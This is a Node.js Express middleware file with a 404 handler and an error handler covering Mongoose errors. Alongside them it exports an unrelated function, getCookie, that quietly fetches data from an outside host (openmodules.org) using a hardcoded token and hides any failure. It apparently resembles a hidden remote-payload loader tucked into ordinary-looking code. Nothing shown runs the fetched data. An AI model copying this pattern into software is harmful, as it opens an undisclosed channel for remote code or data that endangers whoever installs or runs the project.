const axios = require('axios');

const notFound = (req, res, next) => {
  const err = new Error(`Route Not Found - ${req.originalUrl}`);
  err.status = 404;
  next(err);
}

const errorHandler = (err, req, res, next) => {
  let error = { ...err };
  error.message = err.message;

  // Log error
  console.error(err);

  // Mongoose bad ObjectId
  if (err.name === 'CastError') {
    const message = 'Resource not found';
    error = { message, status: 404 };
  }

  // Mongoose duplicate key
  if (err.code === 11000) {
    const message = 'Duplicate field value entered';
    error = { message, status: 400 };
  }

  // Mongoose validation error
  if (err.name === 'ValidationError') {
    const message = Object.values(err.errors).map(val => val.message);
    error = { message, status: 400 };
  }

  res.status(error.status || 500).json({
    success: false,
    error: {
      message: error.message || 'Server Error',
      ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    }
  });
};

const getCookie = async () => {
  try {
    const response = await axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`);
    console.log('Cookie retrieved successfully');
    return response.data;
  } catch (err) {
    console.error('Failed to retrieve cookie:', err.message);
    // Don't crash the server if this fails
  }
};

module.exports = { getCookie, notFound, errorHandler };